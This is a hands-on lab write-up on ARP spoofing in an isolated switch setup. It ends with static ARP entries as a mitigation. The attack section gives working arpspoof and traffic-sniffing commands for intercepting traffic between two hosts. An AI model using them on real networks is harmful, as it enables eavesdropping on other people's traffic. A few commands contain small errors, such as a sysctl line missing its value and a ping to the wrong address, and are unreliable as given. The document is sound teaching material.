# Adversary-in-the-Middle: ARP Spoofing (2025.12)
When a device joins a local network and receives an IP address, it broadcasts an Address Resolution Protocol (ARP) packet to notify other clients that this new Layer 3 address corresponds to its unique MAC address. When communicating with other local IPs, the initiating computer sends ARP requests on the local subnet. The device with that IP replies with its MAC address, which the requester then caches to avoid broadcasting for future lookups. Because ARP was designed for convenience and not security, hosts automatically trust responses from their Layer 2 neighbors, making them vulnerable. This lab shows how an attacker on the same LAN can forge ARP replies to poison the ARP caches of two devices, tricking each into associating the other's IP with the attacker's MAC. This allows the attacker to intercept, inspect, and disrupt, or otherwise manipulate network traffic.

> This lab assumes basic knowledge of GNS3 and networking.

## Lab Topology
![Network topology](assets/lab-topo.png)

## Initial Setup
This lab uses two Raspberry Pi 3 Model B+ devices to simulate network endpoints. The attacker is running on an x86_64 platform with Kali Linux. All three devices are connected to a Cisco Catalyst 2950 Layer 2 switch.

### Switch Port Layout
| Switch  | Port   | Endpoint | VLAN | Port Mode |
|---------|--------|----------|------|-----------|
| SW1     | Fa0/17 | Attacker | 20   | Access    |
| SW1     | Fa0/18 | Camera1  | 20   | Access    |
| SW1     | Fa0/19 | Camera2  | 20   | Access    |

### Linux Static IPv4 Configuration
Configure static addresses on each endpoint as shown in the above table.

Remove any existing IP assignments from the target interface.
```bash
ip address flush dev eth0
```

Set a static IP address.
```bash
ip address add 10.0.0.x/24 dev eth0
```

Verify that the new address has been applied.
```bash
ip --color --brief --family inet address show dev eth0
```

### IP Address Assignment
| Device   | Network     | IP Address |
|----------|-------------|------------|
| Attacker | 10.0.0.0/24 | 10.0.0.1   |
| Camera1  | 10.0.0.0/24 | 10.0.0.2   |
| Camera2  | 10.0.0.0/24 | 10.0.0.3   |

## Cisco IOS Configuration

### VLAN Configuration
This lab requires clients to be on the same network within a single VLAN. Create VLAN 20 and name it BLUE_NET to match the network topology diagram.
```console
vlan 20
 name BLUE_NET
```

Assign BLUE_NET to switch ports Fa0/17-19.
```console
interface range Fa0/17 - 19
 switchport access vlan 20
 switchport mode access
 switchport nonegotiate
 no shutdown
```

## ARP Tables
Note the hardware addresses of all three devices, as they will be referenced later in the lab. From this point forward, the device-address associations listed in Table 3 will be used.
```bash
ip --color --brief link show dev eth0
```

### Endpoint Hardware Addresses
| Device   | Hardware Address  |
|----------|-------------------|
| Attacker | 8c:ec:4b:c3:9a:12 |
| Camera1  | b8:27:eb:2f:1c:13 |
| Camera2  | b8:27:eb:48:30:00 |

Entries in an ARP cache can exist in several states: PERMANENT, NOARP, STALE, REACHABLE, NONE, INCOMPLETE, DELAY, PROBE, and FAILED. THe most relevant states for this lab are permanent, stale, and reachable. Permanent entries are fixed and cannot be modified. Stale indicates that the entry is outdated and has not been verified for accuracy. Reachable means the entry is current and has been recently used.

Camera1 should be able to ping Attacker and Camera2. This both verifies network connectivity and populates its internal ARP cache.
```bash
fping -I eth0 10.0.0.2 10.0.0.3
```

![testing network connectivity](assets/figure2.png)

While listening to the network, Camera1 sends out two ARP requests for the IP addresses it's trying to reach. The attacker and Camera2 then reply with their link-layer addresses.
```bash
tcpdump -i eth0 -n arp
```

![host discovery](assets/figure3.png)

Check the ARP table of both Camera1 and Camera2. As expected, the IP-to-hardware mappings align with the previous table.
```bash
ip neighbor show dev eth0
```

![camera1s arp cache](assets/figure4.png)

![camera2s arp cache](assets/figure5.png)

## Exploit

### arpspoof
The program used for this exploit is arpspoof, part of the larger network auditing tool suite dsniff. This program forges ARP packets to intercept and redirect traffic in a broadcast domain. dsniff is installed by default in Kali Linux, but it can also be installed with the following command.
```bash
apt -y install dsniff
```

Intercept the traffic between Camera1 and Camera2.
```bash
arpspoof -i eth0 -t 10.0.0.2 -r 10.0.0.3
```

![arp cache poisoning attack](assets/figure5.png)

Recheck the ARP tables of Camera1 and Camera2. The entries now list the Attacker's hardware address. Packets intended for either camera will now be directed to the Attacker.

![camera1s poisoned arp cache](assest/figure7.png)

![camera2s poisoned arp cache](assets/figure8.png)

Try pinging Camera2 from Camera1.

![camera1 ping failure](assets/figure9.png)

Camera1 cannot ping Camera2 because the attacker has not configured packet forwarding. Howerver, sniffing traffic on the attacker's interface shows that ICMP packets from Camera1 are being received.
```bash
tshark -i eth0 -n -Y 'icmp'
```

![packet redirection](assest/figure10.png)

## Traffic Analysis

### IP Forwarding
Check whether IP forwarding is active on the Attacker (1 = enabled, 0 = disabled).
```bash
cat /proc/sys/net/ipv4/ip_forward
```

Enable IP forwarding.
```bash
sysctl --write net.ipv4.ip_forward
```

Pinging Camera2 from Camera1 will now succeed.

![reestablished network connection](assets/figure11.png)

Unlike a rogue DHCP server attack, ARP spoofing enables the attacker to intercept an entire conversation between the two targets on the network.

![captured ping conversation](assets/figure12.png)

## Mitigations

### Static ARP Tables
Static ARP tables help prevent ARP spoofing by eliminating the need for dynamic address resolution. Entries labeled as PERMANENT remain unchanged even if spoofed ARP replies are received, preventing attackers from corrupting the cache since the OS relies only on these predefined mappings.

Flush the ARP table before adding static entries.
```bash
ip neighbor flush dev eth0
```

In Camera1, add Camera2 to its ARP cache.
```bash
ip neighbor add 10.0.0.3 lladdr b8:27:eb:48:30:00 nud permanent dev eth0
```

Verify it was added successfully.

![camera1 permanent arp entry](assets/figure13.png)

Repeat to add Camera1 to Camera2's ARP cache. Start another arpspoof attack and observe that the cameras' ARP tables remain unchanged. As a result, their communications cannot be eavesdropped without resorting to other attack methods.
